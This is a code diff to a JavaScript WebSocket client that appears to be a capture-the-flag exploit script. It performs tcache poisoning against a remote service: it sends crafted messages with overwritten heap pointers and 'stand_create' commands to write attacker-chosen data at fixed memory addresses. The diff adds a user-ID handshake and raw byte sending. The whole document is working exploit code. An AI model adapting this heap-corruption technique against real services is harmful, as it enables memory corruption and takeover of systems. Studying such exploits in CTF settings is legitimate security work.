@@ -1,5 +1,6 @@
 // ws = new WebSocket("ws://127.0.0.1:4300");
 ws = new WebSocket("ws://" + location.host + "/ws/");
+USER_ID = "bob";
 
 const onOpen = async () => {
   const waitMsg = () =>
@@ -17,10 +18,12 @@ const onOpen = async () => {
       ws.addEventListener("message", onMsg);
       ws.addEventListener("error", onError);
     });
-  const cmd = async (msg) => {
+
+  const rawCmd = async (msg) => {
     ws.send(msg);
     return await waitMsg();
   };
+  const cmd = (msg) => rawCmd(new TextEncoder().encode(msg));
 
   encoder = new TextEncoder();
 
@@ -37,12 +40,14 @@ const onOpen = async () => {
     msg.set(prefix);
     view.setBigUint64(prefix.length, addr - 8n, true);
     msg.set(suffix, prefix.length + 8);
-    await cmd(msg);
+    await rawCmd(msg);
 
     await cmd("stand_create 2 128 A\n");
     await cmd("stand_create 3 128 " + content + "\n");
   }
 
+  await waitMsg();
+  ws.send(new TextEncoder().encode(USER_ID + "\n"));
   await tcache_poison(0x40630an, "A");
   await tcache_poison(0x406200n, "AAAABBBBCCCC");
 
